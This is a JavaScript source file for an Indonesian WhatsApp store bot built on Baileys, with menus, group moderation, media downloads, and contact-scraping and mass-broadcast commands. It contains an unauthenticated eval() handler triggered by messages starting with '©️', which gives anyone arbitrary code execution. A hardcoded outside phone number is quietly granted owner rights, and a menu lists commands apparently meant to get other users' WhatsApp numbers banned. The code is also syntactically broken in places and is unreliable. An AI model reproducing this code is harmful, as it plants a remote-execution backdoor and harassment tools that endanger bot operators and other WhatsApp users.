require('./Reon')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, =generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./all/lib/color')
const { uptotelegra } = require('./all/lib/upload')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const hxz = require('hxz-api')
const ytdl = require("ytdl-core")
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { remini } = require('./all/lib/remini')
const { TelegraPH } = require("./all/lib/TelegraPH")
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./all/lib/uploader')


const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./all/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
// read database
const thumbnail = fs.readFileSync ('./Reon.png')
const thumb = fs.readFileSync ('./Reon.png')
const kalimage = fs.readFileSync ('./Reon.png')
const pengguna = JSON.parse(fs.readFileSync('./all/database/user.json'))
const ntilink = JSON.parse(fs.readFileSync("./all/lib/antilink.json"))
const antidel = JSON.parse(fs.readFileSync("./all/lib/antidel.json"))
const pler = JSON.parse(fs.readFileSync('./all/lib/idgrup.json').toString())
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))

virgam = fs.readFileSync(`./all/dbase/image/rawr.jpeg`)
const totalFitur = () =>{
            var mytext = fs.readFileSync("./ReonStore.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
//=================================================//
module.exports = ReonStore = async (ReonStore, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix

//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Pake prefix = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const botNumber = await ReonStore.decodeJid(ReonStore.user.id)
const isPremium = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isZeroone = [botNumber, ...global.owner, '6282142435092@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await ReonStore.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const Jpm = m.isGroup ? ntilink.includes(from) : false 
const autodelete = from && isCmd ? antidel.includes(from) : false 
const ZeroGroup = m.isGroup ? pler.includes(m.chat) : false
const isUser = pengguna.includes(m.sender)
const isGroup = from.endsWith('@g.us')
const isContacts = contacts.includes(sender)
const content = JSON.stringify(m.message)

const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const qtod = m.quoted? "true":"false"
//=================================================//}
const cap = 'Reon'
const kalgans = { 
key: {
fromMe: [], 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},

'message': {
	"interactiveMessage": {
						"header": {
						
							"hasMediaAttachment": [],
							"jpegThumbnail": thumb,
													},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6282142435092\",\"product_id\":\"6282142435092\",\"name\":\"YT Remoon\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"
								}
							]
			}
}}}
//=================================================
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}
const reply = (teks) => {
return ReonStore.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER ${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/26abe0a835fe5d4cc2e41.jpg',"thumbnail": thumb,"sourceUrl": `https://chat.whatsapp.com/Ew7hP4G4HTr0EkvqRuBT1s`}}}, { quoted:m})} 

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await ReonStore.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}
//=================================================
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await ReonStore.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}
//=================================================
async function loading () {
var hawemod = [
"⌛10%",
"⏳30%",
"⌛50%",
"⏳80%",
"⌛100%",
"*Loading Selesai...*"
]
let { key } = await ReonStore.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < hawemod.length; i++) {
/*await delay(10)*/
await ReonStore.sendMessage(from, {text: hawemod[i], edit: key });//PESAN LEPAS
}
}
if (autodelete) {
ReonStore.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: mek.key.id,
participant: mek.key.participant
}
})
}
//=================================================
/*let reactionMessage = {
                    react: {
                        text: `👁️‍🗨️`,
                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
                    }
                }
                await sleep(1500)
                ReonStore.sendMessage(m.chat, reactionMessage)*/
//=================================================//
if (!ReonStore.public) {
if (!m.key.fromMe) return
}
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
ReonStore.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
if (isCmd && !isUser) {
pengguna.push(sender)
fs.writeFileSync('./all/database/user.json', JSON.stringify(pengguna, null, 2))
}
// Anti Link
let teksjpm = `Reon

*JOIN MAS 100 MEMBER DAGET*

https://chat.whatsapp.com/Ew7hP4G4HTr0EkvqRuBT1s`;
if (Jpm) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${teksjpm}_`)
let gclink = (`https://chat.whatsapp.com/`+await ReonStore.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return ReonStore.sendMessage(m.chat, {text: `${teksjpm}`})
if (isAdmins) return ReonStore.sendMessage(m.chat, {text: `${teksjpm}`})
await ReonStore.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
}) 
}
}

if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await ReonStore.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return ReonStore.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return ReonStore.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isZeroone) return ReonStore.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await ReonStore.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
ReonStore.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ReonStore.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: ReonStore.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, ReonStore.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
ReonStore.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await ReonStore.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
//=================================================//
switch(command) {
case "menu": {
const text12 = `

┌─> 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
│𖥳 *Nama Creator :* ${namaCreator}
│𖥳 *Nama BOT :* ${namabot}
│𖥳 *Nomor Creator :* ${noCreator}
│𖥳 *Buy Sc :* ${owner}
│𖥳 *Runtime:* ${runtime(process.uptime())}
│𖥳 *Total Fiture:* ${totalFitur()}
└──────────>
┌─> 𝗔𝗞𝗦𝗘𝗦 𝗙𝗜𝗧𝗨𝗥𝗘 𝗦𝗘𝗟𝗟𝗘𝗥
│𖥳 ${prefix}delprem *nomot/@tag*
│𖥳 ${prefix}addprem *nomot/@tag*
└──────────>

┌─> 𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨
│❏ ${prefix}ᴀʟʟᴍᴇɴᴜ
│❏ ${prefix}ᴊᴇʙᴇʜᴍᴇɴᴜ
│❏ ${prefix}sᴛᴏʀᴇᴍᴇɴᴜ
│❏ ${prefix}ʙᴀɴɴᴇᴅᴍᴇɴᴜ
│❏ ${prefix}ᴘᴀɴᴇʟᴍᴇɴᴜ
│❏ ${prefix}ᴘᴀʏᴍᴇɴᴛᴍᴇɴᴜ
│❏ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴍᴇɴᴜ
└─────────>
`
ReonStore.sendMessage(from, { text: text12, contextInfo:{ mentionedJid: [sender], externalAdReply: { thumbnail: thumb, title: `Bot WhatsApp By ${namabot}`, showAdAttribution: true, renderLargerThumbnail: true, containsAutoReply: true, mediaType: 1, sourceUrl: "https://chat.whatsapp.com/Ew7hP4G4HTr0EkvqRuBT1s" }}}, { quoted: m })
}
break
case "bannedmenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

┌─> 𝗕𝗔𝗡𝗡𝗘𝗗 𝗠𝗘𝗡𝗨
│➮ ${prefix}kenon (628xx)
│➮ ${prefix}verif@ (628xx)
│➮ ${prefix}banned (628xx)
│➮ ${prefix}unbannedv2 (628xx)
│➮ ${prefix}unbannedv3 (628xx)
│➮ ${prefix}unbannedv4 (628xx)
│➮ ${prefix}unbannedv5 (628xx)
└──────────>`
ReonStore.sendMessage(from, { text: text12, contextInfo:{ mentionedJid: [sender], externalAdReply: { thumbnail: thumb, title: `Bot WhatsApp By ${namabot}`, showAdAttribution: true, renderLargerThumbnail: true, containsAutoReply: true, mediaType: 1, sourceUrl: "https://chat.whatsapp.com/Ew7hP4G4HTr0EkvqRuBT1s" }}}, { quoted: m })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "jebehmenu": case "jb": {
const text12 = `Hai Kak @${sender.split("@")[0]}

┌─> 𝗝𝗕 𝗠𝗘𝗡𝗨
│➮ ${prefix}bcgc
│➮ ${prefix}jpm
│➮ ${prefix}jpmtag
│➮ ${prefix}tatacaramc
│➮ ${prefix}formatpost1
│➮ ${prefix}formatpost2
│➮ ${prefix}formatpost3
│➮ ${prefix}formatneed
│➮ ${prefix}feerekber
│➮ ${prefix}formatpencairan
│➮ ${prefix}mc *_nama gc_*
│➮ ${prefix}allrec
│➮ ${prefix}danamasuk
│➮ ${prefix}ᴅᴏɴᴇᴍᴄ
│➮ ${prefix}ɪᴅɢʀᴏᴜᴘ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴀᴄᴛ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1 *idgroup*
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅ *id|text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄ *text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅᴊᴅ *id|jeda|textT*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄᴊᴅ *jeda|text*
└──────────>`
ReonStore.sendMessage(from, { text: text12, contextInfo:{ mentionedJid: [sender], externalAdReply: { thumbnail: thumb, title: `Bot WhatsApp By ${namabot}`, showAdAttribution: true, renderLargerThumbnail: true, containsAutoReply: true, mediaType: 1, sourceUrl: "https://chat.whatsapp.com/Ew7hP4G4HTr0EkvqRuBT1s" }}}, { quoted: m })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "storemenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

┌─> 𝗦𝗧𝗢𝗥𝗘 
│➮ ${prefix}feerekber
│➮ ${prefix}formatpost
│➮ ${prefix}formatneed
│➮ ${prefix}mc *nama group*
│➮ ${prefix}payment
│➮ ${prefix}proses
│➮ ${prefix}tunda
│➮ ${prefix}batal
│➮ ${prefix}done
│➮ ${prefix}ɪᴅɢʀᴏᴜᴘ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴀᴄᴛ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1 *idgroup*
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅ *id|text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄ *text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅᴊᴅ *id|jeda|textT*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄᴊᴅ *jeda|text*
└──────────>`
ReonStore.sendMessage(from, { text: text12, contextInfo:{ mentionedJid: [sender], externalAdReply: { thumbnail: thumb, title: `Bot WhatsApp By ${namabot}`, showAdAttribution: true, renderLargerThumbnail: true, containsAutoReply: true, mediaType: 1, sourceUrl: "https://chat.whatsapp.com/Ew7hP4G4HTr0EkvqRuBT1s" }}}, { quoted: m })
}
break
case "stickermenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

┌─> 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 
│➮ ${prefix}qc *text*
│➮ ${prefix}toimage
│➮ ${prefix}smeme
│➮ ${prefix}sticker *gambar*
└──────────>`
ReonStore.sendMessage(from, { text: text12, contextInfo:{ mentionedJid: [sender], externalAdReply: { thumbnail: thumb, title: `Bot WhatsApp By ${namabot}`, showAdAttribution: true, renderLargerThumbnail: true, containsAutoReply: true, mediaType: 1, sourceUrl: "https://chat.whatsapp.com/Ew7hP4G4HTr0EkvqRuBT1s" }}}, { quoted: m })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'allmenu': {
m.reply(`Hay Kak ${pushname} 👋 
Selamat ${salam}
Status : ${isZeroone ? 'Premium' : 'Free'}

┌─> 𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨
│➮ ${prefix}ᴅᴏɴᴀsɪ
│➮ ${prefix}ᴏᴡɴᴇʀ
│➮ ${prefix}sᴄʀɪᴘᴛ
│➮ ${prefix}sᴛɪᴄᴋᴇʀ *gambar*
│➮ ${prefix}ғᴇᴇᴀᴅᴍɪɴ/ᴍᴄ
│➮ ${prefix}ǫᴄ *teks*
│➮ ${prefix}ᴘᴀʏᴍᴇɴᴛ
│➮ ${prefix}ᴛᴀᴛᴀᴄᴀʀᴀᴍᴄ
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ1
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ2
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ3
│➮ ${prefix}ғᴏʀᴍᴀᴛɴᴇᴇᴅ
└──────────>
┌─> 𝗣𝗨𝗦𝗛𝗞𝗢𝗡𝗧𝗔𝗞
│➮ ${prefix}ɪᴅɢʀᴏᴜᴘ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴀᴄᴛ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1 *idgroup*
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅ *id|text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄ *text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅᴊᴅ *id|jeda|textT*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄᴊᴅ *jeda|text*
└──────────>
┌─> 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨
│➮ ${prefix}ᴀᴅᴅ
│➮ ${prefix}ᴋɪᴄᴋ
│➮ ${prefix}sᴇᴛᴅᴇᴋs
│➮ ${prefix}ᴀɴᴛɪʟɪɴᴋ
│➮ ${prefix}sᴇᴛɴᴀᴍᴀ
│➮ ${prefix}ᴇᴅɪᴛɢʀᴏᴜᴘ *ᴄʟᴏsᴇ/ᴏᴘᴇɴ*
│➮ ${prefix}ᴇᴅɪᴛɪɴғᴏ
│➮ ${prefix}ᴘʀᴏᴍᴏᴛᴇ
│➮ ${prefix}ᴅᴇᴍᴏᴛᴇ
│➮ ${prefix}ʜɪᴅᴇᴛᴀɢᴇ
│➮ ${prefix}ᴘʀᴏᴍᴏᴛᴇᴀʟʟ
│➮ ${prefix}ᴅᴇᴍᴏᴛᴇᴀʟʟ
│➮ ${prefix}sᴇɴᴅʟɪɴᴋɢᴄ
│➮ ${prefix}ʟɪɴᴋɢʀᴏᴜᴘ
│➮ ${prefix}ʀᴇsᴇᴛʟɪɴᴋɢᴄ
└──────────>
┌─> 𝗦𝗧𝗢𝗥𝗘 
│➮ ${prefix}ғᴇᴇᴍᴄ
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ
│➮ ${prefix}ғᴏʀᴍᴀᴛɴᴇᴇᴅ
│➮ ${prefix}ᴍᴄ *ɴᴀᴍᴀ ɢʀᴏᴜᴘ*
│➮ ${prefix}ᴘᴀʏᴍᴇɴᴛ
│➮ ${prefix}ᴘʀᴏsᴇs
│➮ ${prefix}ᴛᴜɴᴅᴀ
│➮ ${prefix}ʙᴀᴛᴀʟ
│➮ ${prefix}ᴅᴏɴᴇ
└──────────>
┌─> 𝗝𝗕 𝗠𝗘𝗡𝗨
│➮ ${prefix}ʙᴄɢᴄ
│➮ ${prefix}ᴊᴘᴍ
│➮ ${prefix}ᴊᴘᴍᴛᴀɢ
│➮ ${prefix}ᴛᴀᴛᴀᴄᴀʀᴀᴍᴄ
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ1
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ2
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ3
│➮ ${prefix}ғᴏʀᴍᴀᴛɴᴇᴇᴅ
│➮ ${prefix}ғᴇᴇᴍᴄ
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴇɴᴄᴀɪʀᴀɴ
│➮ ${prefix}ᴍᴄ *ɴᴀᴍᴀ ɢʀᴏᴜᴘ*
│➮ ${prefix}ᴀʟʟʀᴇᴄ
│➮ ${prefix}ᴅᴀɴᴀᴍᴀsᴜᴋ
│➮ ${prefix}ᴅᴏɴᴇʀᴇᴋʙᴇʀ
│➮ ${prefix}ᴅᴏɴᴇᴍᴄ
│➮ ${prefix}ɪᴅɢʀᴏᴜᴘ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴀᴄᴛ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1 *idgroup*
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅ *id|text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄ *text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅᴊᴅ *id|jeda|textT*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄᴊᴅ *jeda|text*
└──────────>
┌─> 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 
│➮ ${prefix}qc *text*
│➮ ${prefix}toimage
│➮ ${prefix}smeme
│➮ ${prefix}sticker *gambar*
└──────────>
┌─> 𝗕𝗔𝗡𝗡𝗘𝗗 𝗠𝗘𝗡𝗨
│➮ ${prefix}kenon (628xx)
│➮ ${prefix}verif@ (628xx)
│➮ ${prefix}banned (628xx)
│➮ ${prefix}unbannedv2 (628xx)
│➮ ${prefix}unbannedv3 (628xx)
│➮ ${prefix}unbannedv4 (628xx)
│➮ ${prefix}unbannedv5 (628xx)
└──────────>
┌─> 𝗥𝗔𝗡𝗗𝗢𝗠
│➮ ${prefix}ʀᴇᴍɪɴɪ
│➮ ${prefix}ᴘɪɴᴛᴇʀᴇsᴛ
│➮ ${prefix}sᴛɪᴄᴋᴇʀ
│➮ ${prefix}ǫᴄ
│➮ ${prefix}ᴏᴡɴᴇʀ
│➮ ${prefix}sᴄʀɪᴘᴛ
│➮ ${prefix}ᴛᴏᴜʀʟ
└──────────>
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'groupmenu': {
m.reply(`Hay Kak ${pushname} 👋 
Selamat ${salam}
Status : ${isZeroone ? 'Premium' : 'Free'}

┌─> 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨
│➮ ${prefix}ᴀᴅᴅ
│➮ ${prefix}ᴋɪᴄᴋ
│➮ ${prefix}sᴇᴛᴅᴇᴋs
│➮ ${prefix}ᴀɴᴛɪʟɪɴᴋ
│➮ ${prefix}sᴇᴛɴᴀᴍᴀ
│➮ ${prefix}ɢʀᴏᴜᴘ *ᴄʟᴏsᴇ/ᴏᴘᴇɴ*
│➮ ${prefix}ᴇᴅɪᴛɪɴғᴏ
│➮ ${prefix}ᴘʀᴏᴍᴏᴛᴇ
│➮ ${prefix}ᴅᴇᴍᴏᴛᴇ
│➮ ${prefix}ʜɪᴅᴇᴛᴀɢᴇ
│➮ ${prefix}ᴘʀᴏᴍᴏᴛᴇᴀʟʟ
│➮ ${prefix}ᴅᴇᴍᴏᴛᴇᴀʟʟ
│➮ ${prefix}sᴇɴᴅʟɪɴᴋɢᴄ
│➮ ${prefix}ʟɪɴᴋɢʀᴏᴜᴘ
│➮ ${prefix}ʀᴇsᴇᴛʟɪɴᴋɢᴄ
└──────────>
`)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'randommenu': {
m.reply(`Hay Kak ${pushname} 👋 
Selamat ${salam}
Status : ${isZeroone ? 'Premium' : 'Free'}

┌─> 𝗥𝗔𝗡𝗗𝗢𝗠
│➮ ${prefix}ʀᴇᴍɪɴɪ
│➮ ${prefix}ᴘɪɴᴛᴇʀᴇsᴛ
│➮ ${prefix}sᴛɪᴄᴋᴇʀ
│➮ ${prefix}ǫᴄ
│➮ ${prefix}ᴏᴡɴᴇʀ
│➮ ${prefix}sᴄʀɪᴘᴛ
│➮ ${prefix}ᴛᴏᴜʀʟ
└──────────>
`)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'othermenu': {
m.reply(`Hay Kak ${pushname} 👋 
Selamat ${salam}
